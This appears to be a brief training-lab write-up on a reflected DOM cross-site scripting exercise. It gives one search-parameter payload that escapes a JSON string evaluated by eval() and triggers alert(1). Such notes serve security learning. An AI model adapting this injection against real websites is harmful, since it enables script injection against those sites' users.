# Lab 12 — Reflected DOM XSS (PRACTITIONER)

## Payload
```
/search?search=\"-alert(1)}//
```
Breaks out of JSON string in `eval()`'d server response.
